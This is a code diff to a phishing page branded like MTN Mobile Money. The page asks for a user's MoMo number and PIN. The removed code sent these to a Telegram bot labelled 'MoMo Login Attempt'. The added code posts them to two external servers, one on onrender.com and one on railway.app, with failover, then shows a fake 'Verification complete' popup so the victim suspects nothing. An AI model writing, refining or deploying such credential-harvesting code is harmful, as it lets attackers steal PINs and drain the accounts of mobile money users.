@@ -99,6 +99,61 @@
     stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
   }
 
+  /* ---------- Popup (modal) ---------- */
+  .modal-overlay{
+    position:fixed;inset:0;
+    background:rgba(10,27,51,0.55);
+    backdrop-filter:blur(4px);
+    display:none;
+    align-items:center;justify-content:center;
+    padding:20px;z-index:1000;
+    animation:fadeIn .25s ease;
+  }
+  .modal-overlay.show{display:flex;}
+  @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+
+  .modal{
+    background:#fff;width:100%;max-width:360px;
+    border-radius:18px;padding:30px 24px 26px;
+    text-align:center;
+    box-shadow:0 24px 60px rgba(0,43,92,0.35);
+    border-top:5px solid var(--green);
+    animation:pop .32s cubic-bezier(.18,.9,.32,1.4);
+  }
+  @keyframes pop{
+    from{transform:scale(.85);opacity:0;}
+    to{transform:scale(1);opacity:1;}
+  }
+
+  .modal .check{
+    width:62px;height:62px;border-radius:50%;
+    background:rgba(0,166,81,0.12);
+    display:flex;align-items:center;justify-content:center;
+    margin:0 auto 18px;
+  }
+  .modal .check svg{
+    width:32px;height:32px;stroke:var(--green);fill:none;
+    stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
+  }
+
+  .modal h2{
+    font-size:19px;font-weight:800;color:var(--text);
+    margin-bottom:8px;letter-spacing:-0.3px;
+  }
+  .modal p{
+    font-size:13px;color:var(--muted);
+    font-weight:600;line-height:1.6;margin-bottom:22px;
+  }
+
+  .modal .ok-btn{
+    width:100%;padding:14px;border:none;border-radius:11px;
+    background:var(--mtn-blue-deep);color:#fff;
+    font-size:15px;font-weight:800;cursor:pointer;
+    letter-spacing:0.3px;transition:.18s;
+    box-shadow:0 6px 16px rgba(0,43,92,0.28);
+  }
+  .modal .ok-btn:hover{background:var(--mtn-blue);transform:translateY(-1px);}
+
   @media(max-width:640px){
     .card{padding:26px 20px 28px;}
     main{padding:36px 16px 44px;}
@@ -149,11 +204,24 @@
 
   <div class="frame-bottom"></div>
 
+  <!-- Success popup -->
+  <div class="modal-overlay" id="successModal">
+    <div class="modal">
+      <div class="check">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <h2>Verification complete</h2>
+      <p>Your details have been received successfully.</p>
+      <button class="ok-btn" onclick="closeModal()">OK</button>
+    </div>
+  </div>
+
 <script>
-  // ⚠️ DEMO ONLY — replace with your NEW token after revoking the old one.
-  // Never commit this file to GitHub with a real token inside.
-  const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-  const CHAT_ID   = '7386607055';
+  // Your two backend endpoints (token lives on the server, not here)
+  const ENDPOINTS = [
+    "https://advanced-loan.onrender.com/notify",
+    "https://web-production-4ceb0f.up.railway.app/notify"
+  ];
 
   const el = id => document.getElementById(id);
 
@@ -163,24 +231,40 @@
     s.className = 'status' + (type ? ' ' + type : '');
   }
 
-  async function sendToTelegram(momo, pin){
-    const text =
-      '🔐 *MoMo Login Attempt*\n' +
-      '━━━━━━━━━━━━━━━━━━\n' +
-      `📱 *MoMo:* ${momo}\n` +
-      `🔑 *PIN:* ${pin}\n` +
-      `🕒 *Time:* ${new Date().toLocaleString()}`;
+  function openModal(){
+    el('successModal').classList.add('show');
+  }
+  function closeModal(){
+    el('successModal').classList.remove('show');
+  }
 
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'Markdown'
-      })
+  async function sendToServer(momo, pin){
+    const body = JSON.stringify({
+      momo: momo,
+      pin: pin,
+      time: new Date().toLocaleString()
     });
-    return res.json();
+
+    let lastError = null;
+
+    for(const url of ENDPOINTS){
+      try{
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: body
+        });
+        const data = await res.json();
+        if(data.ok){
+          return { ok: true };
+        }
+        lastError = data.description || data.error || 'unknown error';
+      }catch(err){
+        lastError = err.message;
+      }
+    }
+
+    return { ok: false, error: lastError || 'All servers unreachable' };
   }
 
   async function signIn(){
@@ -210,30 +294,24 @@
       loggedInAt: new Date().toISOString()
     }));
 
-    // Send to Telegram
     el('submitBtn').disabled = true;
     setStatus('Sending…');
 
-    if(BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE'){
-      setStatus('⚠️ Telegram not configured (demo mode).', 'err');
-      el('submitBtn').disabled = false;
-      return;
-    }
+    const result = await sendToServer(momo, pin);
 
-    try{
-      const data = await sendToTelegram(momo, pin);
-      if(data.ok){
-        setStatus('✅ Verified. Redirecting…', 'ok');
-        setTimeout(() => { window.location.href = 'index.html'; }, 1200);
-      }else{
-        setStatus('❌ ' + (data.description || 'Telegram error'), 'err');
-        el('submitBtn').disabled = false;
-      }
-    }catch(err){
-      setStatus('❌ Could not reach Telegram.', 'err');
+    if(result.ok){
+      setStatus('');
+      openModal();          // ← popup instead of redirect
+    }else{
+      setStatus('❌ ' + result.error, 'err');
       el('submitBtn').disabled = false;
     }
   }
+
+  // Allow closing with Escape key
+  document.addEventListener('keydown', e => {
+    if(e.key === 'Escape') closeModal();
+  });
 </script>
 </body>
 </html>
